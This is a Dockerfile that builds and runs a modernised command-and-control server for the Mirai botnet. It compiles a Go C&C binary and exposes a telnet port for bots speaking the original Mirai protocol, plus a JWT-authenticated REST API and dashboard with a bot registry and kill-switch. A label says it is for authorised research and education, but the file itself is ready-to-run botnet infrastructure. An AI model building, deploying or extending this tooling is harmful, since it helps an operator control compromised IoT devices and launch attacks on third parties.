# Mirai 2026 CNC Server — Modern Go Implementation
# Builds cnc_modern.go: REST API + WebSocket + JWT auth + bot registry + kill-switch
#
# Ports:
#   23   — Bot telnet connections (original Mirai protocol)
#   8080 — REST API + WebSocket dashboard
#
# Build:
#   docker build -f docker/Dockerfile.cnc -t mirai-2026/cnc:latest .
# Run:
#   docker-compose up cnc

# ── Stage 1: Builder ──────────────────────────────────────────────────────────
FROM golang:1.22-alpine AS builder

# Install build dependencies
RUN apk add --no-cache \
    git \
    ca-certificates \
    build-base

WORKDIR /build

# Copy go.mod and go.sum first for layer caching
COPY mirai/cnc/go.mod .
COPY mirai/cnc/go.sum .

# Download and verify dependencies
RUN go mod download && go mod verify

# Copy cnc_modern.go as standalone main (has //go:build ignore — strip it for Docker)
# We copy it as main_modern.go so it compiles standalone without the legacy files.
COPY mirai/cnc/cnc_modern.go ./cnc_modern_src.go

# Strip the //go:build ignore tag so it compiles in this isolated context
RUN sed '/^\/\/go:build ignore/d; /^\/\/ +build ignore/d' cnc_modern_src.go > main.go && \
    rm cnc_modern_src.go

# Build the modern CNC binary
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -X main.version=2.4.0' \
    -o cnc_modern_server \
    main.go && \
    ls -lh cnc_modern_server && \
    echo "✅ cnc_modern_server built successfully"

# ── Stage 2: Runtime ──────────────────────────────────────────────────────────
FROM alpine:3.19

# Install runtime dependencies
RUN apk add --no-cache \
    ca-certificates \
    tzdata \
    wget

# Create non-root user
RUN addgroup -S mirai && \
    adduser -S -G mirai mirai

WORKDIR /app

# Copy modern binary from builder
COPY --from=builder /build/cnc_modern_server /app/cnc_modern_server

# Set permissions
RUN chmod +x /app/cnc_modern_server && \
    chown -R mirai:mirai /app

# Expose ports
# 23   — Bot connections (original Mirai 2-byte ping/pong protocol)
# 8080 — REST API (JWT-authenticated) + WebSocket push
EXPOSE 23 8080

# Environment defaults — override at runtime
ENV BOT_PORT=23
ENV API_PORT=8080
ENV JWT_SECRET=mirai2026-CHANGE-IN-PRODUCTION
ENV BOT_CHALLENGE_SECRET=
ENV DATABASE_ADDR=postgres
ENV DATABASE_USER=mirai
ENV DATABASE_PASS=
ENV DATABASE_NAME=mirai
ENV LOG_LEVEL=info

# Health check via REST API
HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
    CMD wget -qO- http://localhost:8080/api/health || exit 1

# Run as non-root
USER mirai

# Metadata
LABEL org.opencontainers.image.title="Mirai 2026 CNC Modern Server"
LABEL org.opencontainers.image.description="Modern Go C&C — REST API, WebSocket, JWT, kill-switch, bot registry"
LABEL org.opencontainers.image.version="2.4.0"
LABEL security.ethical-use="For authorized security research and education only"

ENTRYPOINT ["/app/cnc_modern_server"]
